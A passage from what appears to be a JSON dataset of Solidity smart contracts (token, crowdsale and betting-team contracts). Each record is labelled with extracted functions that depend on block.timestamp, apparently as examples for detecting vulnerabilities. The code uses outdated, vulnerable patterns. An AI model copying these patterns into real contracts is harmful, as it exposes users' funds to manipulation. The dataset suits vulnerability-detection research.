onlyOwner\n {\n require(!started);\n started = true;\n releaseTime = block.timestamp + interval;\n emit LockStarted(block.timestamp, interval);\n }\n function release(address beneficiary)\n external\n {\n require(msg.sender == distributor);\n require(started);\n require(block.timestamp >= releaseTime);\n uint256 amount = buyers[beneficiary];\n buyers[beneficiary] = 0;\n Token.safeTransfer(beneficiary, amount);\n emit TokenReleased(beneficiary, amount);\n }\n function withdraw() public onlyOwner {\n require(block.timestamp >= releaseTime);\n Token.safeTransfer(owner, Token.balanceOf(address(this)));\n }\n function close() external onlyOwner {\n withdraw();\n selfdestruct(owner);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}",
  "extract_feature": [
    "function withdraw() public onlyOwner {\nrequire(block.timestamp >= releaseTime);\nToken.safeTransfer(owner, Token.balanceOf(address(this)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f75"
  },
  "filename": "9242.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n mapping(address => uint256) internal balances_;\n mapping(address => mapping(address => uint256)) internal allowed_;\n uint256 internal totalSupply_;\n string public name;\n string public symbol;\n uint8 public decimals;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances_[_owner];\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed_[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[msg.sender]);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[_from]);\n require(_value <= allowed_[_from][msg.sender]);\n balances_[_from] = balances_[_from].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed_[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract EthTeamContract is StandardToken, Ownable {\n event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);\n event EndGame(address indexed team1, address indexed team2, uint8 gameResult);\n event ChangeStatus(address indexed team, uint8 status);\n uint256 public price;\n uint8 public status;\n uint64 public gameTime;\n uint64 public finishTime;\n address public feeOwner;\n address public gameOpponent;\n function EthTeamContract(\n string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner\n ) public {\n name = _teamName;\n symbol = _teamSymbol;\n decimals = 3;\n totalSupply_ = 0;\n price = 1 szabo;\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n finishTime = _finishTime;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if (_to != address(this)) {\n return super.transfer(_to, _value);\n }\n require(_value <= balances_[msg.sender] && status == 0 && gameTime == 0);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n uint256 weiAmount = price.mul(_value);\n msg.sender.transfer(weiAmount);\n emit Transfer(msg.sender, _to, _value);\n emit Sell(_to, msg.sender, _value, weiAmount);\n return true;\n }\n function() payable public {\n require(status == 0 && price > 0 && gameTime > block.timestamp);\n uint256 amount = msg.value.div(price);\n balances_[msg.sender] = balances_[msg.sender].add(amount);\n totalSupply_ = totalSupply_.add(amount);\n emit Transfer(address(this), msg.sender, amount);\n emit Buy(address(this), msg.sender, amount, msg.value);\n }\n function changeStatus(uint8 _status) onlyOwner public {\n require(status != _status);\n status = _status;\n emit ChangeStatus(address(this), _status);\n }\n function changeFeeOwner(address _feeOwner) onlyOwner public {\n require(_feeOwner != feeOwner && _feeOwner != address(0));\n feeOwner = _feeOwner;\n }\n function finish() onlyOwner public {\n require(block.timestamp >= finishTime);\n feeOwner.transfer(address(this).balance);\n }\n function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {\n require(_gameOpponent != address(this));\n require(_gameTime == 0 || (_gameTime > 1514764800));\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n status = 0;\n emit BeginGame(address(this), _gameOpponent, _gameTime);\n }\n function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {\n require(gameOpponent != address(0) && gameOpponent == _gameOpponent);\n uint256 amount = address(this).balance;\n uint256 opAmount = gameOpponent.balance;\n require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);\n EthTeamContract op = EthTeamContract(gameOpponent);\n if (_gameResult == 1) {\n if (amount > 0 && totalSupply_ > 0) {\n uint256 lostAmount = amount;\n if (op.totalSupply() > 0) {\n uint256 feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else {\n op.transferFundAndEndGame();\n }\n } else if (_gameResult == 2) {\n if (amount > opAmount) {\n lostAmount = amount.sub(opAmount).div(2);\n if (op.totalSupply() > 0) {\n feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else if (amount == opAmount) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n } else if (_gameResult == 3) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n endGameInternal();\n if (totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n emit EndGame(address(this), _gameOpponent, _gameResult);\n }\n function endGameInternal() private {\n gameOpponent = address(0);\n gameTime = 0;\n status = 0;\n }\n function transferFundAndEndGame() payable public {\n require(gameOpponent != address(0) && gameOpponent == msg.sender);\n if (msg.value > 0 && totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n endGameInternal();\n }\n}",
  "extract_feature": [
    "function finish() onlyOwner public {\nrequire(block.timestamp >= finishTime);\nfeeOwner.transfer(address(this).balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f76"
  },
  "filename": "9300.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract DynamicRateCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public bonusRate;\n constructor(uint256 _bonusRate) public {\n require(_bonusRate > 0);\n bonusRate = _bonusRate;\n }\n function getCurrentRate() public view returns (uint256) {\n return rate.add(bonusRate);\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n uint256 currentRate = getCurrentRate();\n return currentRate.mul(_weiAmount);\n }\n}\ncontract AllowanceCrowdsale is Crowdsale {\n using SafeMath for uint256;\n address public tokenWallet;\n constructor(address _tokenWallet) public {\n require(_tokenWallet != address(0));\n tokenWallet = _tokenWallet;\n }\n function remainingTokens() public view returns (uint256) {\n return token.allowance(tokenWallet, this);\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transferFrom(tokenWallet, _beneficiary, _tokenAmount);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract EoptCrowdsale is Crowdsale, CappedCrowdsale, AllowanceCrowdsale, DynamicRateCrowdsale, TimedCrowdsale, Ownable {\n constructor(\n uint256 _rate,\n uint256 _bonusRate,\n address _wallet,\n ERC20 _token,\n uint256 _cap,\n address _tokenWallet,\n uint256 _openingTime,\n uint256 _closingTime\n )\n Crowdsale(_rate, _wallet, _token)\n CappedCrowdsale(_cap)\n AllowanceCrowdsale(_tokenWallet)\n TimedCrowdsale(_openingTime, _closingTime)\n DynamicRateCrowdsale(_bonusRate)\n public\n {\n }\n event Purchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount,\n uint256 weiRaised,\n uint256 rate,\n uint256 bonusRate,\n uint256 cap\n );\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount)\n internal\n {\n super._updatePurchasingState(_beneficiary, _weiAmount);\n uint256 tokens = _getTokenAmount(_weiAmount);\n emit Purchase(\n msg.sender,\n _beneficiary,\n _weiAmount,\n tokens,\n weiRaised,\n rate,\n bonusRate,\n cap\n );\n }\n function setRate(uint256 _rate) onlyOwner public {\n require(_rate > 0 && _rate < 1000000);\n rate = _rate;\n }\n function setBonusRate(uint256 _bonusRate) onlyOwner public {\n require(_bonusRate > 0 && _bonusRate < 1000000);\n bonusRate = _bonusRate;\n }\n function setClosingTime(uint256 _closingTime) onlyOwner public {\n require(_closingTime >= block.timestamp);\n require(_closingTime >= openingTime);\n closingTime = _closingTime;\n }\n function setCap(uint256 _cap) onlyOwner public {\n require(_cap > 0 && _cap < 500000000000000000000000);\n cap = _cap;\n }\n function setToken(ERC20 _token) onlyOwner public {\n require(_token != address(0));\n token = _token;\n }\n function setTokenWallet(address _tokenWallet) onlyOwner public {\n require(_tokenWallet != address(0));\n tokenWallet = _tokenWallet;\n }\n function setWallet(address _wallet) onlyOwner public {\n require(_wallet != address(0));\n wallet = _wallet;\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function setClosingTime(uint256 _closingTime) onlyOwner public {\nrequire(_closingTime >= block.timestamp);\nrequire(_closingTime >= openingTime);\nclosingTime = _closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f77"
  },
  "filename": "9309.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) 